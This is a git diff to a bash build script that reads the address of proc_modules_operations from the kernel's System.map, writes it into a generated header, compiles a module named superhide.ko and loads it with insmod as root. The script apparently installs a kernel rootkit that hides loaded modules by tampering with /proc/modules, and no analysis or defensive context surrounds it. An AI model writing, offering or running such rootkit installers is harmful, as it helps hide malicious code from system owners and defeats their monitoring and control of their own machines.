@@ -1,5 +1,12 @@
 #!/bin/bash
 
+RET=0
+# require root privs
+if [[ $UID != 0 ]]; then
+	echo "Please run this script with sudo"
+	exit 1
+fi
+
 # generate the file we need
 
 smap="/boot/System.map-$(uname -r)"
@@ -15,3 +22,16 @@ procline=$(cat $smap | grep '\Wproc_modules_operations$')
 set $procline
 
 echo -e "struct file_operations* proc_modules_operations = (struct file_operations*)0x$1;" >> ./sysgen.h
+
+# make it
+make
+
+if [ $? -eq 0 ]; then
+	# insert the module
+	insmod ./superhide.ko
+else
+	echo "make failed"
+	RET=1
+fi
+
+exit $RET
